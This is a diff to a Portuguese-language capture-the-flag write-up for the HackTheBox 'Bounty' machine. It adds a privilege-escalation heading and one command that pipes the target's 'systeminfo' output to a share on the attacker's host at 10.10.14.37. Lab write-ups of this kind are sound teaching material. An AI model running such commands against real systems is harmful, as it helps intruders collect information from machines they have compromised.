@@ -2760,3 +2760,12 @@ Execute
 
 ![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bounty/10.jpg)
 
+## Privilege Escalation
+
+Comecando a sessao para escalar privilegios...
+
+`systeminfo >> \\10.10.14.37\tools\systeminfo.txt`
+
+![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bounty/11.jpg)
+
+
